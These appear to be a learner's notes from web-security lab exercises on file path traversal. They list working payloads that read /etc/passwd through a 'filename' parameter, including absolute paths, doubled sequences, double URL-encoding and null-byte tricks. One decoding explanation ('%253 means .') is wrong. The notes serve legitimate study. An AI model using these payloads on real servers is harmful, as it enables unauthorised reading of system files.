Note: the vulnerable parameter needs a file name and not an id or anything else 

  

File Path Traversal

     - filename=../../../

          - go back 3 times to go to root directory because the website directory is this/var/www/img

  

File path traversal,traversal sequences blocked with absolute path bypass

     - filename=/etc/passwd

  

File path traversal, traversal sequences stripped non-recursively

     - filename=....//....//....//etc/passwd

          -- the website strip the input by ../ therefore inputting ....// will result to ../

  

  

File path traversal, traversal sequences stripped with superfluous URL-decode

     - filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

          -- %253 means "." and %252f is "/" so the  above means ../../../etc/passwd

          -- can be approached like this ..%252f..%252f..%252fetc/passwd

  

     - %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

          -- %2e means "." while %2f is "/" so the above means ../../../etc/passwd

  

  

File path traversal, validation of start of path

     - filename= /var/www/images/../../../etc/passwd

          -- ? I dont know if we can see this in the real world scenario because exposing the directory is VERY vulnerable and very BAD practice ¯\_(ツ)_/¯

  

  

File path traversal, validation of file extension with null byte bypass

     - filename=../../../etc/passwd%00.jpg
